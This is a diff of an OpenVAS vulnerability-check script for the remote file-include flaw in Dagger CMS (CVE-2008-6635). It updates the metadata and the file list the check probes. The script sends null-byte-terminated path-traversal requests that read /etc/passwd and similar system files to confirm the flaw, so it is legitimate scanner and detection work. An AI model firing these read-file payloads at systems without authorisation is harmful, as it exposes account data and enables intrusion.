@@ -1,6 +1,6 @@
 ###############################################################################
 # OpenVAS Vulnerability Test
-# $Id: dagger_remote_file_include.nasl 9350 2018-04-06 07:03:33Z cfischer $
+# $Id: dagger_remote_file_include.nasl 11821 2018-10-10 12:44:18Z jschulte $
 #
 # Dagger 'skins/default.php' Remote File Include Vulnerability
 #
@@ -24,73 +24,80 @@
 # Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
 ###############################################################################
 
-tag_summary = "Dagger is prone to a remote file-include vulnerability because it
+if (description)
+{
+  script_oid("1.3.6.1.4.1.25623.1.0.100050");
+  script_version("$Revision: 11821 $");
+  script_tag(name:"last_modification", value:"$Date: 2018-10-10 14:44:18 +0200 (Wed, 10 Oct 2018) $");
+  script_tag(name:"creation_date", value:"2009-03-16 12:53:50 +0100 (Mon, 16 Mar 2009)");
+  script_tag(name:"cvss_base", value:"6.8");
+  script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:P/I:P/A:P");
+  script_cve_id("CVE-2008-6635");
+  script_bugtraq_id(29906);
+  script_name("Dagger 'skins/default.php' Remote File Include Vulnerability");
+  script_category(ACT_ATTACK);
+  script_tag(name:"qod_type", value:"remote_vul");
+  script_family("Web application abuses");
+  script_copyright("This script is Copyright (C) 2009 Greenbone Networks GmbH");
+  script_dependencies("find_service.nasl", "http_version.nasl", "os_detection.nasl");
+  script_require_ports("Services/www", 80);
+  script_require_keys("Host/runs_unixoide");
+  script_exclude_keys("Settings/disable_cgi_scanning");
+  script_tag(name:"solution_type", value:"VendorFix");
+  script_tag(name:"solution", value:"Vendor updates are available. ");
+  script_tag(name:"summary", value:"Dagger is prone to a remote file-include vulnerability because it
   fails to sufficiently sanitize user-supplied data.
 
   An attacker can exploit this issue to execute malicious PHP code in
   the context of the webserver process. This may facilitate a
   compromise of the application and the underlying computer; other
-  attacks are also possible.";
-
-tag_solution = "Vendor updates are available. See http://labs.geody.com/dagger/ fore more 
-  information.";
-
-if (description)
-{
- script_oid("1.3.6.1.4.1.25623.1.0.100050");
- script_version("$Revision: 9350 $");
- script_tag(name:"last_modification", value:"$Date: 2018-04-06 09:03:33 +0200 (Fri, 06 Apr 2018) $");
- script_tag(name:"creation_date", value:"2009-03-16 12:53:50 +0100 (Mon, 16 Mar 2009)");
- script_tag(name:"cvss_base", value:"6.8");
- script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:P/I:P/A:P");
- script_cve_id("CVE-2008-6635");
- script_bugtraq_id(29906);
- script_name("Dagger 'skins/default.php' Remote File Include Vulnerability");
- script_category(ACT_ATTACK);
- script_tag(name:"qod_type", value:"remote_vul");
- script_family("Web application abuses");
- script_copyright("This script is Copyright (C) 2009 Greenbone Networks GmbH");
- script_dependencies("find_service.nasl", "http_version.nasl");
- script_require_ports("Services/www", 80);
- script_exclude_keys("Settings/disable_cgi_scanning");
- script_tag(name : "solution" , value : tag_solution);
- script_tag(name : "summary" , value : tag_summary);
- script_xref(name : "URL" , value : "http://www.securityfocus.com/bid/29906");
- exit(0);
+  attacks are also possible.");
+  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/29906");
+  script_xref(name:"URL", value:"http://labs.geody.com/dagger/");
+  exit(0);
 }
 
 include("http_func.inc");
 include("http_keepalive.inc");
+include("misc_func.inc");
 
 port = get_http_port(default:80);
 if(!can_host_php(port:port)) exit(0);
 
-foreach dir( make_list_unique( "/dagger", "/cms", cgi_dirs( port:port ) ) ) { 
+files = traversal_files("linux");
+
+foreach dir( make_list_unique( "/dagger", "/cms", cgi_dirs( port:port ) ) ) {
 
   if( dir == "/" ) dir = "";
-  url = string(dir, "/skins/default.php?dir_inc=/etc/passwd%00");
-  req = http_get(item:url, port:port);
-  buf = http_keepalive_send_recv(port:port, data:req, bodyonly:1);
-  if( buf == NULL )continue;
 
-  if( egrep(pattern:"root:.*:0:[01]:.*", string: buf) ) {    
-    report = report_vuln_url( port:port, url:url );
-    security_message( port:port, data:report );
-    exit( 0 );
-  } else {
-    #/etc/passwd could not be read, try the "joke" File ../etc/passwd. 
-    url = string(dir, "/skins/default.php?dir_inc=../etc/passwd%00");
+  foreach pattern( keys( files ) ) {
+
+    file = files[pattern];
+
+    url = string(dir, "/skins/default.php?dir_inc=/" + file + "%00");
     req = http_get(item:url, port:port);
     buf = http_keepalive_send_recv(port:port, data:req, bodyonly:1);
     if( buf == NULL )continue;
-	
-    if ( egrep(pattern:"Hi, lamer!", string: buf) &&
-         egrep(pattern:".*SMILE, YOU'RE ON CANDID CAMERA!.*", string: buf) ) {
+
+    if( egrep(pattern:pattern, string: buf) ) {
       report = report_vuln_url( port:port, url:url );
-      security_message( port:port, data:report ); # who is the lamer now?
+      security_message( port:port, data:report );
       exit( 0 );
+    } else {
+      #/etc/passwd could not be read, try the "joke" File ../etc/passwd.
+      url = string(dir, "/skins/default.php?dir_inc=../" + file + "%00");
+      req = http_get(item:url, port:port);
+      buf = http_keepalive_send_recv(port:port, data:req, bodyonly:1);
+      if( buf == NULL )continue;
+
+      if ( egrep(pattern:"Hi, lamer!", string: buf) &&
+           egrep(pattern:".*SMILE, YOU'RE ON CANDID CAMERA!.*", string: buf) ) {
+        report = report_vuln_url( port:port, url:url );
+        security_message( port:port, data:report ); # who is the lamer now?
+        exit( 0 );
+      }
     }
-  }  
+  }
 }
 
 exit( 99 );
